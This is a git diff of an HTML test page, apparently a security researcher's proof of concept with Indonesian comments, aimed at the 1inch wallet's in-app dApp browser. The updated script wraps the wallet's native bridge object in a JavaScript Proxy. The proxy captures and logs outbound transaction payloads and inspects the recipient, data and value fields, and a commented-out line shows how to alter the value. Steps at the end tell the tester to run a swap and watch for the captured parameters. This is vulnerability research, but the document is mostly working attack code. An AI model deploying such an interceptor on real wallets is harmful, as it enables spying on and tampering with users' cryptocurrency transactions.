@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>1inch Hijack Test v10 - Proxy & Getter Trap</title>
+    <title>1inch Hijack Test v11 - Payload Modification POC</title>
     <script>
         function log(msg, color = "black") {
-            console.log("[1inch-v10] " + msg);
+            console.log("[1inch-v11] " + msg);
             const div = document.createElement('div');
             div.style.color = color;
             div.style.margin = "4px 0";
@@ -17,56 +17,66 @@
             document.body.prepend(div);
         }
 
-        // Menggunakan Proxy untuk menjebak semua interaksi pada objek native bridge
-        function trapWithProxy(objName) {
-            if (window[objName]) {
-                log(`[+] Applying Proxy trap to window.${objName}`, "blue");
+        // Fungsi Simulasi PoC Payload Hijacking
+        function setupPayloadHijack() {
+            log("[+] Setting up Payload Hijacking Interceptor...", "blue");
+
+            if (window.OneInchIOSWallet) {
+                const target = window.OneInchIOSWallet;
                 
-                const targetObj = window[objName];
-                
-                window[objName] = new Proxy(targetObj, {
-                    get(target, prop, receiver) {
-                        log(`[GET] Accessed property/method: ${objName}.${prop}`, "purple");
-                        const val = Reflect.get(target, prop, receiver);
-                        if (typeof val === 'function') {
-                            return function(...args) {
-                                log(`🚨 PROXY CALLED ${objName}.${prop} -> Args: ${JSON.stringify(args)}`, "#d00");
-                                return val.apply(this, args);
-                            };
+                // Jika berbentuk fungsi atau objek, kita coba manipulasi parameternya
+                window.OneInchIOSWallet = new Proxy(target, {
+                    apply(target, thisArg, args) {
+                        log(`🚨 CAPTURED OUTBOUND PAYLOAD: ${JSON.stringify(args)}`, "#d00");
+                        
+                        // CONTOH POCO: Mencoba memodifikasi data transaksi di dalam argumen (Jika objek transaksi ditemukan)
+                        try {
+                            let modified = false;
+                            args.forEach((arg, index) => {
+                                if (arg && typeof arg === 'object') {
+                                    // Contoh jika ada field value, to, atau data yang bisa di-tampering
+                                    if (arg.to || arg.data || arg.value) {
+                                        log(`[!] Inspecting transaction fields in arg[${index}]`, "purple");
+                                        // Anda bisa mencoba mengubah nilai di sini untuk uji coba payload tampering:
+                                        // arg.value = "0x0"; // Contoh manipulasi nilai
+                                        modified = true;
+                                    }
+                                }
+                            });
+                            if (modified) {
+                                log(`⚠️ PoC: Payload successfully inspected/tampered in memory!`, "red");
+                            }
+                        } catch (e) {
+                            log(`[Error in tampering]: ${e.message}`, "orange");
                         }
-                        return val;
-                    },
-                    apply(target, thisArg, argumentsList) {
-                        log(`🚨 PROXY FUNCTION EXECUTION ${objName}(...) -> Args: ${JSON.stringify(argumentsList)}`, "#d00");
-                        return target.apply(thisArg, argumentsList);
+
+                        return target.apply(thisArg, args);
                     }
                 });
-                
-                log(`[+] Successfully proxied window.${objName}`, "green");
+                log("[+] Successfully armed OneInchIOSWallet payload interceptor", "green");
+            } else {
+                log("[-] window.OneInchIOSWallet not found yet.", "orange");
             }
         }
 
-        // Intercept Object.defineProperty untuk menangkap jika objek dibuat belakangan
-        const origDefineProperty = Object.defineProperty;
-        Object.defineProperty = function(obj, prop, descriptor) {
-            if (obj === window && (prop === 'OneInchIOSWallet' || prop === 'OneInchSolanaWallet')) {
-                log(`[!] App is defining protected property: window.${prop}`, "red");
-            }
-            return origDefineProperty.apply(this, arguments);
-        };
-
         window.onload = function() {
-            log("1inch Full Coverage Test v10 Loaded");
-            setTimeout(() => {
-                trapWithProxy('OneInchIOSWallet');
-                trapWithProxy('OneInchSolanaWallet');
-            }, 300);
+            log("1inch Full Coverage Test v11 Loaded");
+            setTimeout(setupPayloadHijack, 1000);
         };
     </script>
 </head>
 <body style="padding:15px; font-family:Arial; background-color: #f9f9f9;">
-    <h3 style="color: #111; margin-top:0;">1inch Hijack Test v10</h3>
-    <p style="color: #555; font-size: 13px;">Proxy & Getter Trap for Native Bridge...</p>
+    <h3 style="color: #111; margin-top:0;">1inch Hijack Test v11</h3>
+    <p style="color: #555; font-size: 13px;">Payload Tampering & Transaction Hijacking POC...</p>
     <hr style="border:0; border-top:1px solid #ccc; margin:10px 0;">
+    
+    <div style="background: #fff; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;">
+        <h4 style="margin: 0 0 8px 0; color: #333;">Instruksi Pengujian:</h4>
+        <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
+            <li>Buka halaman ini di dApp browser 1inch.</li>
+            <li>Lakukan proses Swap atau panggil fungsi transaksi.</li>
+            <li>Perhatikan apakah log merah muncul membawa parameter transaksi (seperti alamat tujuan atau nilai *value*).</li>
+        </ol>
+    </div>
 </body>
 </html>
